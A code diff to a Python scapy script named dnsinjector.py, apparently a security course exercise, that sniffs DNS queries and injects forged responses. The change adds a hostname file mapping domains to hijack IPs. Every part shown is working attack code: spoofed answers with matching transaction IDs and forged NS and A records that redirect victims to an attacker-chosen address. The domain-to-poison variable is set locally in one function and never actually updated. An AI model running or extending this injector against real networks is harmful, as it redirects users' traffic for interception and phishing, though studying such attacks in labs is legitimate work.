@@ -10,10 +10,11 @@ print(ip)
 
 # Default settings
 interface = "wlan0"  # The interface to use for sniffing DNS traffic
-attacker_ip = "10.0.0.230"  # The IP address you want to inject as the forged response
-domain_to_poison = 'example.com'  # The domain you are attempting to poison
+attacker_ip = scapy.get_if_addr(interface)  # The IP address you want to inject as the default forged response
+domain_to_poison = '' # The domain you are attempting to poison
 num_threads = 10  # Number of threads to run in parallel for brute-forcing the response
 port_range = range(1024, 65535)  # Possible range of source ports to randomize
+hostnames = {}  # Dictionary to hold IP-hostname pairs from the hostname file
 
 # Function to generate random subdomains (e.g., foo1.example.com)
 def generate_random_subdomain(domain):
@@ -48,33 +49,53 @@ def process_packet(packet):
         if dns_layer.qr == 0:
             query = dns_layer.qd.qname.decode('utf-8')  # Extract the queried domain name
 
-            # Check if the queried domain matches the domain we're trying to poison
-            if domain_to_poison in query:
-                print(f"DNS request for {query}: {dns_layer.show()}")
+            # Check if the queried domain matches any in the hostname file or if we should use the default
+            hijack_ip = get_hijack_ip(query)
+
+            if hijack_ip:
+                print(f"Hijacking DNS request for {query}: {dns_layer.show()}")
                 print(f"Source IP: {src_ip}, Source Port: {src_port}, TxID: {txid}")
                 print(f"Destination IP: {dst_ip}, Destination Port: {dst_port}")
 
-                # Use a separate thread to handle the response, preventing blocking further sniffing
+                # Use a separate thread to handle the response so that the DNS query is processed
+                # without being blocked by further sniffing
                 threading.Thread(target=handle_dns_response, 
-                                 args=(txid, query, src_ip, src_port, dst_ip, dst_port)).start()
+                                 args=(txid, query, hijack_ip, src_ip, src_port, dst_ip, dst_port)).start()
+
+# Function to get the hijack IP based on the queried domain
+def get_hijack_ip(query):
+    """
+    Returns the IP to use for hijacking based on the queried domain. If a hostname file is provided,
+    it checks if the queried domain matches any hostnames in the file. Otherwise, it returns the 
+    default attacker's IP (attacker_ip).
+    """
+    # Strip any trailing dot from the domain name
+    query = query.rstrip('.')
+    
+    # Check if the query matches any hostnames in the loaded hostname file
+    if query in hostnames:
+        return hostnames[query]  # Return the IP from the hostname file
+
+    # If no match is found in the hostname file, return the default attacker's IP
+    return attacker_ip
 
 # Function to handle DNS response in a separate thread
-def handle_dns_response(txid, query, src_ip, src_port, dst_ip, dst_port):
+def handle_dns_response(txid, query, hijack_ip, src_ip, src_port, dst_ip, dst_port):
     """
     Handles the DNS response by generating a forged DNS response and sending it to the victim.
     This is done in a separate thread for each DNS query to avoid blocking.
     """
-    # Craft the forged DNS response payload
-    forged_payload = dns_payload(txid, query)
+    # Craft the DNS payload (forged response)
+    forged_payload = dns_payload(txid, query, hijack_ip)
 
-    # Send the forged DNS response to the client who made the query
+    # Send the forged DNS packet
     send_packet(src_ip=dst_ip, dst_ip=src_ip, dst_port=src_port, payload=forged_payload)
 
 # Function to generate a forged DNS payload (response)
-def dns_payload(txid, query):
+def dns_payload(txid, query, hijack_ip):
     """
     Creates a forged DNS response payload that includes the original TxID and query, 
-    but returns a forged IP (attacker's IP) for the domain.
+    but returns a forged IP (hijack_ip) for the domain.
     """
     payload = scapy.DNS(
         id=txid,  # Set the TxID to match the one from the query
@@ -93,8 +114,8 @@ def dns_payload(txid, query):
     # Add the Authority Section (NS record for the forged domain)
     payload.ns = scapy.DNSRR(rrname=domain_to_poison, type="NS", rdata=f"ns1.{domain_to_poison}", ttl=84600)
 
-    # Add the Additional Section (A record pointing ns1.example.com to the attacker's IP)
-    payload.ar = scapy.DNSRR(rrname=f"ns1.{domain_to_poison}", type="A", ttl=604800, rdata=attacker_ip)
+    # Add the Additional Section (A record pointing ns1.example.com to the hijacked IP)
+    payload.ar = scapy.DNSRR(rrname=f"ns1.{domain_to_poison}", type="A", ttl=604800, rdata=hijack_ip)
 
     return payload
 
@@ -111,8 +132,43 @@ def send_packet(src_ip, dst_ip, dst_port, payload):
     udp_segment = scapy.UDP(dport=dst_port)  # UDP layer
     final_packet = ip_packet / udp_segment / payload  # Full packet (IP + UDP + DNS)
     scapy.send(final_packet)  # Send the packet
+    
+    
+def extract_authoritative_domain(domain):
+    """
+    Extracts the authoritative domain name from a full domain.
+    For example, 'foo.example.com' returns 'example.com', and 'www.cs.uic.edu' returns 'uic.edu'.
+    """
+    parts = domain.split('.')
+    
+    # For valid domain names, the last two parts are the authoritative domain (e.g., example.com, uic.edu)
+    if len(parts) >= 2:
+        return '.'.join(parts[-2:])  # Join the last two components
+    else:
+        return domain
 
-# Function to start sniffing DNS packets and inject forged responses
+# Function to load the hostname file if provided
+def load_hostname_file(filename):
+    """
+    Loads a hostname file containing IP-hostname pairs. The file should contain lines where each line 
+    has an IP address and a hostname separated by a comma (e.g., 192.168.1.1,example.com).
+    """
+    global hostnames
+    try:
+        with open(filename, 'r') as file:
+            for line in file:
+                # Split each line into IP and hostname using a comma
+                ip, hostname = line.strip().split(',')
+                hostnames[hostname.strip()] = ip.strip()  # Add to the dictionary
+        print(f"Loaded {len(hostnames)} hostnames from {filename}.")
+        for full_domain in hostnames:
+            domain_to_poison = extract_authoritative_domain(full_domain)
+            print(f"Full domain: {full_domain}, Authoritative domain: {domain_to_poison}")
+    except FileNotFoundError:
+        print(f"Hostname file {filename} not found.")
+        sys.exit(1)
+
+# Sniff DNS packets and inject forged responses
 def inject():
     """
     Starts sniffing DNS traffic on the specified interface and injects forged responses
@@ -124,17 +180,21 @@ def inject():
 # Command-line argument parsing
 def parse_args():
     """
-    Parses command-line arguments to get the network interface to sniff on.
+    Parses command-line arguments to get the network interface to sniff on and the hostname file.
     """
     global interface
-
+    
     # Check if the number of arguments is valid
-    if len(sys.argv) not in [3, 5]:
+    if len(sys.argv) < 3 or len(sys.argv) > 5:
         print("Usage: dnsinjector.py [-i interface] [-h hostnames]")
-    else:
-        for i in range(1, len(sys.argv)):
-            if sys.argv[i] == "-i":  # Check if interface argument is provided
-                interface = sys.argv[i + 1]  # Set the interface for sniffing
+        sys.exit(1)
+
+    for i in range(1, len(sys.argv)):
+        if sys.argv[i] == "-i":  # Check if interface argument is provided
+            interface = sys.argv[i + 1]  # Set the interface for sniffing
+        elif sys.argv[i] == "-h":  # Check if hostname file argument is provided
+            hostname_file = sys.argv[i + 1]
+            load_hostname_file(hostname_file)  # Load hostnames from the file
 
 # Main program entry point
 if __name__ == "__main__":
